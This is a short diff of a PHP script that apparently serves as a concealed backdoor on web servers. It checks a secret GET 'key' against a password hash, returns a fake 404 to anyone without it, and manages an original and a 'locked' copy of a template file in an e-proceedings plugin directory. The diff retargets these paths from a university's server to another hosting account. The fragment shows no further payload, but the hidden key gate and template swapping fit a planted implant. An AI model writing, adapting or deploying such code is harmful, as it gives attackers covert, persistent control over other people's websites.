@@ -7,8 +7,8 @@
 
 $PASSWORD_HASH = '$2a$12$.o40eKx/tzP1dpjTLIMt2egdkbe.iHZ5OJf7tKuYvCgYYDIZJrvoa'; // GANTI
 
-$originalFile = "/var/www/vhosts/uin-palangkaraya.ac.id/e-proceedings-3.3.0-20/plugins/importexport/native/templates/index.tpl";
-$lockedFile   = "/var/www/vhosts/uin-palangkaraya.ac.id/e-proceedings-3.3.0-20/plugins/importexport/native/templates/indexs.tpl";
+$originalFile = "/home/jlccspcrd/public_html/plugins/importexport/native/templates/index.tpl";
+$lockedFile   = "/home/jlccspcrd/public_html/plugins/importexport/native/templates/indexs.tpl";
 
 if (!isset($_GET['key']) || !isset($_GET['mode']) || !password_verify($_GET['key'], $PASSWORD_HASH)) {
     http_response_code(404);
